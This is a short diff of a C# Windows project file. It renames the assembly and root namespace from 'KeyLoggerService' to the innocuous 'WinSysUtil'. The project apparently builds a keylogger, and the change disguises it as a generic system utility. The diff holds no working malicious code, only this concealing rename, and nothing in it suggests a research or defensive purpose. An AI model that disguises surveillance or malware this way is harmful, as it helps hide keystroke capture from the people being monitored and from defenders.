@@ -6,8 +6,8 @@
     <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
     <ProjectGuid>{1AB9E022-70A1-4B67-9B04-84FCA209A1E1}</ProjectGuid>
     <OutputType>WinExe</OutputType>
-    <RootNamespace>KeyLoggerService</RootNamespace>
-    <AssemblyName>KeyLoggerService</AssemblyName>
+    <RootNamespace>WinSysUtil</RootNamespace>
+    <AssemblyName>WinSysUtil</AssemblyName>
     <TargetFrameworkVersion>v4.8</TargetFrameworkVersion>
     <FileAlignment>512</FileAlignment>
     <AutoGenerateBindingRedirects>true</AutoGenerateBindingRedirects>
